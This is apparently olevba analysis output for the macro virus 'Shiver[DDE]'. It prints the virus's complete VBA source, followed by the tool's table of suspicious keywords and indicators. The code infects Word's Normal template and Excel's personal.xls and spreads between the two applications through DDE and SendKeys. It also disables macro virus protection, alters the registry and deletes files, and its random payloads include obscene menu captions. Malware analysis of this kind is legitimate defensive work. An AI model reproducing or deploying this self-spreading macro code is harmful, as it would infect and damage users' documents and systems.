olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Shiver-8a2337009bda7df06a1391fc0a56d21770b424ee
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Shiver-8a2337009bda7df06a1391fc0a56d21770b424ee 
in file: Virus.MSOffice.Shiver-8a2337009bda7df06a1391fc0a56d21770b424ee - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long

Public ExcelFound, WordFound, Marker, JustRun As Boolean

Sub AutoExec()

On Error Resume Next            ' Error Handler

Call WordStealth                        ' Word Stealth Routine

If UCase(Dir(Application.StartupPath & "\Word8.dot")) <> "WORD8.DOT" Then

Documents.Add Template:="", NewTemplate:=False

Open "c:\sentry.sys" For Output As 1
Print #1, "Attribute VB_Name = ""Sentry"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""Module1"").Name <> ""Module1"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\shiver.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close 1

ActiveDocument.VBProject.VBComponents.Import "c:\sentry.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word8.dot").Close
End If
End Sub

Sub AutoOpen()

Dim Set1 As Long

On Error Resume Next

Call wdTrigger                  ' check if payload and other settings

Set1 = &H0

Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = Set1

Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

AI = True
NI = True

If NormalTemplate.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then NI = False
If ActiveDocument.VBProject.VBComponents.Item("Module1").Name <> "Module1" Then AI = False

Call WordStealth                        ' Check Word Stealth
If NI = False Then
NormalTemplate.VBProject.VBComponents.Import "c:\shiver.sys"
End If

If AI = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\shiver.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

End Sub

Sub WordStealth()
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub

Sub AutoExit()

Randomize

On Error GoTo out               ' on error DO NOT do next - goto out

Call CheckMarker                ' check to see if we are already setup in Excel

hWnd = FindApp("XLMain")        ' Is Excel running ?

If hWnd <> 0 Then ExcelFound = True             ' Did we find Excel running?

If ExcelFound = False And Marker = False Then

Application.WindowState = wdWindowStateMinimize

Call PersonalFun

Shell (Application.Path + "\Excel.exe"), vbMinimizedFocus

Do While ExcelFound = False
    Call FindExcel
Loop

Application.DDETerminateAll

CNL = Application.DDEInitiate("Excel", "system")

Application.DDEExecute CNL, "[New(4)]"

Application.DDETerminate CNL                    ' close this channel

CNL = Application.DDEInitiate("Excel", "Macro1")

Application.DDEPoke CNL, Item:="R1C1", Data:="=VBA.INSERT.FILE(""c:\shiver.sys"")"
Application.DDEPoke CNL, Item:="R2C1", Data:="=SAVE.AS(""" & Application.Path & "\xlstart\personal.xls"")"
Application.DDEPoke CNL, Item:="R3C1", Data:="=Return()"

DDEExecute channel:=CNL, Command:="[Run(""R1C1"")]"

Application.DDETerminate CNL                    ' close this channel

CNL = Application.DDEInitiate("Excel", "system")

Application.DDEExecute CNL, "[RUN(""Personal.xls!PXL_Done"")]"

Application.DDETerminate CNL                    ' close this channel

Call MakeMarker                         ' make our infection marker in the reg

JustRun = True                          ' we just ran cross infection

End If

out:

If (Int(Rnd * 30) = 5) Then Call wdReEvalInfection

End Sub

Sub FindExcel()
On Error Resume Next
For x = 1 To 50
    w = Tasks.Item(x)
    If Mid(w, 1, 15) = "Microsoft Excel" Then
        ExcelFound = True
        Exit Sub
    End If
Next x
End Sub

Function FindApp(ByVal varClassName As Variant) As Long
   If IsNull(varClassName) Then
      FindApp = 0
   Else
      FindApp = FindWindow(CStr(varClassName), 0&)
   End If
End Function

Sub PersonalFun()
PSLIVE = Application.Path + "\xlstart\personal.xls"
PS = Dir(PSLIVE)
If "PERSONAL.XLS" = UCase(PS) Then
Kill PSLIVE
End If
End Sub

Sub CheckMarker()
If Application.Application = "Microsoft Word" Then
mkr = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]")
Else
mkr = GetSetting("Office", "8.0", "Shiver[DDE]")
End If
If mkr = "ALT-F11" Then Marker = True
End Sub

Sub MakeMarker()
If Application.Application = "Microsoft Word" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "ALT-F11"
Else
SaveSetting "Office", "8.0", "Shiver[DDE]", "ALT-F11"
End If
End Sub

Sub PXL_Done()
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Application.Quit
End Sub

Sub Auto_Open()
Application.OnSheetActivate = "ShiverTime"
End Sub

Sub ShiverTime()

Randomize

On Error Resume Next

Call xlTrigger                  ' check if payload and other settings

If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

CommandBars("Window").Controls("Unhide...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False

If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True

For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i

If SXLS = False Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWorkbook.Save
End If

If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWindow.Visible = False                    ' hide personal.xls
Workbooks("personal.xls").Save          ' save personal.xls
End If

If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then

Open "c:\o6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1

Open "c:\o6.bat" For Output As 1
Print #1, "regedit /s c:\o6.reg"
Close 1
End If

End Sub

Sub wdTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
If Int(Rnd * 75) = 60 Then                              ' check random conditions
CommandBars("Tools").Controls("Macro").Caption = "Shiver[DDE] by ALT-F11"
CommandBars("File").Controls("Versions...").Caption = "Cum Stained Sheets..."
CommandBars("Edit").Controls("Paste Special...").Caption = "Hey Man I Did Your Mom..."
CommandBars("Insert").Controls("Break...").Caption = "Wanna do some MDMA ?"
CommandBars("Help").Controls("About Microsoft Word").Caption = "Peace, Love and Drugs"
CommandBars("File").Controls("Properties").Caption = "I'll die happy, you'll just die"
CommandBars("Edit").Controls("Go To...").Caption = "Heywood Jablowmi"
CommandBars("Tools").Controls("Word Count...").Caption = "Body Count"
CommandBars("Format").Controls("Font...").Caption = "Cunt..."
CommandBars("File").Controls("Close").Caption = "No Clothes"
CommandBars("Window").Controls("Split").Caption = "Blow Me"
CommandBars("Insert").Controls("Picture").Caption = "Crusty Porn GIF"
CommandBars("File").Controls("Print...").Caption = "My Balls Itch..."
CommandBars("Format").Controls("Bullets and Numbering...").Caption = "Pills And Needles"
CommandBars("Table").Controls("Insert Table...").Caption = "Insert and Probe..."
CommandBars("Tools").Controls("Customize...").Caption = "Sodomize..."
CommandBars("Tools").Controls("Spelling and Grammar...").Caption = "Spelling and Your Grandma..."
CommandBars("View").Controls("Toolbars").Caption = "Gaybars"
CommandBars("View").Controls("Master Document").Caption = "Masturbation"

ElseIf Int(Rnd * 400) = 188 Then                        ' check random conditions

Open "c:\sister.dll" For Output As 1            ' put the lyrics into c:\sister.dll
Print #1, "Hey Man, I Kinda Like Your Sister"
Print #1, "Hey Man, I Hope That's Cool"
Print #1, "Hey Man, I Kinda Lose My Mind"
Print #1, "Every Single Time I Find Your Sister"
Print #1, "Suntanned By The Pool"
Print #1, "Hey Man, I Wanna See Her Naked"
Print #1, "Hey Man, I'm Always In Her Room"
Print #1, "All Alone When No One's There"
Print #1, "Going Through Her Underwear"
Print #1, "Hey Man, I Gotta See Her Soon"
Print #1, "Hey Man, I'll Never Get Her Pregnant"
Print #1, "But Hey Man, How Can I Resist Her"
Print #1, "The Day I Give Her A Wedding Band"
Print #1, "Are You Going To Be My Best Man?"
Print #1, "Hey Man, I Kinda Like Your Sister"
Print #1, "I Kinda Like Your Sister"
Print #1, "I Kinda Like Your Sister"
Print #1, "I Kinda Like Her"
Close 1
Shell "write c:\sister.dll", vbMaximizedFocus   ' put the lyrics into Write and show it
End If
End Sub

Sub xlTrigger()
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Int(Rnd * 800) = 601 Then
For x = 1 To 30
RR = (Chr(65 + Int(Rnd * 12))) & x
Range(RR).AddComment
Range(RR).Comment.Visible = True
Range(RR).Comment.Text Text:="Shiver[DDE] by ALT-F11"
Range(RR).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300)
Next x
End If
End Sub

Sub Auto_Close()

On Error GoTo out 	' on error don't do next - go to out

Call CheckMarker		' check for our registry marker

hWnd = FindApp("OpusApp")

If hWnd <> 0 Then WordFound = True		' was Word found running?

If WordFound = False And Marker = False Then

Shell Application.Path & "\winword.exe", vbMinimizedFocus

CNL = Application.DDEInitiate("MSWord", "system")

Application.DDEExecute CNL, "[fileclose]"

Application.DDEExecute CNL, "[Sendkeys ""%{F11}""]"

Application.DDEExecute CNL, "[Sendkeys ""^m""]"

Call delay

SendKeys "c:\shiver.sys", Wait

SendKeys "%o"

Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""y""]"

Application.DDETerminate CNL

Call MakeMarker                         ' make our infection marker in the reg

JustRun = True                          ' we just ran cross infection

End If

out:

On Error Resume Next		' new error handler - if error run next
Shell "c:\o6.bat", vbHide	' shell the Excel reg file

If (Int(Rnd * 30) = 5) Then Call xlReEvalInfection

End Sub

Sub delay()
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + 2
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
End Sub

Sub wdReEvalInfection()
If UCase(Dir(Application.Path + "\xlstart\personal.xls")) <> "PERSONAL.XLS" And Marker = True And JustRun <> True Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "NoNoNo"
End If
End Sub

Sub xlReEvalInfection()
If UCase(Dir(Application.Path & "\startup\Word8.dot")) <> "WORD8.DOT" And Marker = True And JustRun <> True Then
SaveSetting "Office", "8.0", "Shiver[DDE]", "NoNoNo"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMaximizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |o6.reg              |Executable file name                         |
|IOC       |O6.REG              |Executable file name                         |
|IOC       |o6.bat              |Executable file name                         |
|IOC       |O6.BAT              |Executable file name                         |
|IOC       |sister.dll          |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

